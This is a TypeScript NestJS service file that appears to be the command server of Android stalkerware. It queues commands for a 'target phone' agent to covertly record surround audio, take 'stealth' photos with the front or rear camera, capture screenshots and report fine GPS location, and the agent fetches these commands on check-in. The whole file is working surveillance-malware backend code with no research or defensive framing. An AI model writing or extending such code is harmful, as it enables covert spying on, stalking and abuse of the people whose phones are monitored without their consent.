import { Injectable, NotFoundException } from '@nestjs/common';

export interface SurroundAudioCommandDto {
  deviceId: string;
  durationSec: number; // 60, 120, 300 seconds
}

export interface StealthPhotoCommandDto {
  deviceId: string;
  camera: 'FRONT' | 'REAR';
}

export interface ScreenshotCommandDto {
  deviceId: string;
}

export interface SyncLocationCommandDto {
  deviceId: string;
}

@Injectable()
export class CommandsService {
  private activeCommandQueue = new Map<string, any[]>();

  // 1. Live Surround Audio Stream Trigger
  async triggerSurroundAudio(dto: SurroundAudioCommandDto) {
    const commandId = `cmd_audio_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'RECORD_SURROUND_AUDIO',
      durationSec: dto.durationSec || 60,
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Live Surround Audio (${dto.durationSec}s)`);
    return { success: true, commandId, message: 'Surround audio command dispatched to device' };
  }

  // 2. Stealth Camera Photo Capture Trigger
  async triggerStealthPhoto(dto: StealthPhotoCommandDto) {
    const commandId = `cmd_photo_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'CAPTURE_STEALTH_PHOTO',
      camera: dto.camera || 'FRONT',
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Stealth Photo (${dto.camera} camera)`);
    return { success: true, commandId, message: 'Stealth photo capture command dispatched' };
  }

  // 3. Instant Screen Capture Trigger
  async triggerScreenshot(dto: ScreenshotCommandDto) {
    const commandId = `cmd_scr_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'CAPTURE_SCREENSHOT',
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered Instant Screenshot`);
    return { success: true, commandId, message: 'Screenshot command dispatched' };
  }

  // 4. Instant GPS Triangulation Trigger
  async triggerLocationSync(dto: SyncLocationCommandDto) {
    const commandId = `cmd_loc_${Date.now().toString(36)}`;
    const payload = {
      commandId,
      action: 'SYNC_FINE_LOCATION',
      timestamp: new Date()
    };

    this.queueCommand(dto.deviceId, payload);
    console.log(`[Command Engine] Device ${dto.deviceId}: Triggered High-Accuracy Location Sync`);
    return { success: true, commandId, message: 'Location sync command dispatched' };
  }

  // Helper: Enqueue Command for Target Phone MQTT / Socket Delivery
  private queueCommand(deviceId: string, commandPayload: any) {
    const queue = this.activeCommandQueue.get(deviceId) || [];
    queue.push(commandPayload);
    this.activeCommandQueue.set(deviceId, queue);
  }

  // Endpoint for Android Agent to fetch pending commands on check-in
  async getPendingCommands(deviceId: string) {
    const queue = this.activeCommandQueue.get(deviceId) || [];
    this.activeCommandQueue.set(deviceId, []); // Clear queue on retrieval
    return { count: queue.length, commands: queue };
  }
}
